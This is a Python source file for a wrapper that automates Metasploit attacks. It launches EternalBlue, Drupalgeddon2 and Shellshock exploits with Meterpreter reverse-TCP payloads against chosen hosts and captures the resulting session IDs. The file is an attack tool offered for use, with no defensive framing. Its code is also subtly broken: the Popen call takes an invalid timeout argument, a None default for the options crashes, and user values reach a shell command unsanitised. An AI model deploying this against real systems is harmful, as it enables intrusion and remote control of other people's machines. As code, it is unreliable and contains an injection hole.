import subprocess
import tempfile
import os
import time
import re

class MetasploitWrapper:
    def __init__(self):
        self.exploits = {
            'eternalblue': 'exploit/windows/smb/ms17_010_eternalblue',
            'drupalgeddon2': 'exploit/unix/webapp/drupal_drupalgeddon2',
            'shellshock': 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
            'heartbleed': 'auxiliary/scanner/ssl/openssl_heartbleed'
        }
        
        self.payloads = {
            'windows': 'windows/x64/meterpreter/reverse_tcp',
            'linux': 'linux/x64/meterpreter/reverse_tcp',
            'python': 'python/meterpreter/reverse_tcp'
        }

    def execute(self, exploit_name, options=None):
        if exploit_name not in self.exploits:
            return {'error': f'Exploit {exploit_name} not found'}

        # Set defaults
        rhosts = options.get('RHOSTS', '127.0.0.1')
        rport = options.get('RPORT', '445')
        lhost = options.get('LHOST', '127.0.0.1')
        lport = options.get('LPORT', '4444')
        payload = options.get('PAYLOAD', self.payloads['linux'])
        auto_check = options.get('AutoCheck', 'false')

        # Create resource script
        script_content = [
            f'use {self.exploits[exploit_name]}',
            f'set RHOSTS {rhosts}',
            f'set RPORT {rport}',
            f'set PAYLOAD {payload}',
            f'set LHOST {lhost}',
            f'set LPORT {lport}',
            f'set VERBOSE true',
            f'set AutoCheck {auto_check}',
            'exploit -z -j'  # Run in background
        ]

        script_file = self._create_resource_file(script_content)

        try:
            # Run msfconsole
            cmd = f"msfconsole -q -r {script_file} --output-format json"
            
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=180
            )

            stdout, stderr = process.communicate()

            # Parse JSON output if available
            result = {
                'success': process.returncode == 0,
                'exploit': exploit_name,
                'target': rhosts,
                'output': stdout,
                'error': stderr if stderr else None
            }

            # Try to extract session info
            session_match = re.search(r'Session (\d+) created', stdout)
            if session_match:
                result['session_id'] = session_match.group(1)

            return result

        except subprocess.TimeoutExpired:
            process.kill()
            return {'error': 'Exploit timeout exceeded (3 minutes)'}
        except Exception as e:
            return {'error': str(e)}
        finally:
            if os.path.exists(script_file):
                os.remove(script_file)

    def _create_resource_file(self, commands):
        fd, path = tempfile.mkstemp(suffix='.rc', text=True)
        with os.fdopen(fd, 'w') as f:
            f.write('\n'.join(commands))
            f.write('\nexit\n')  # Ensure msfconsole exits
        return path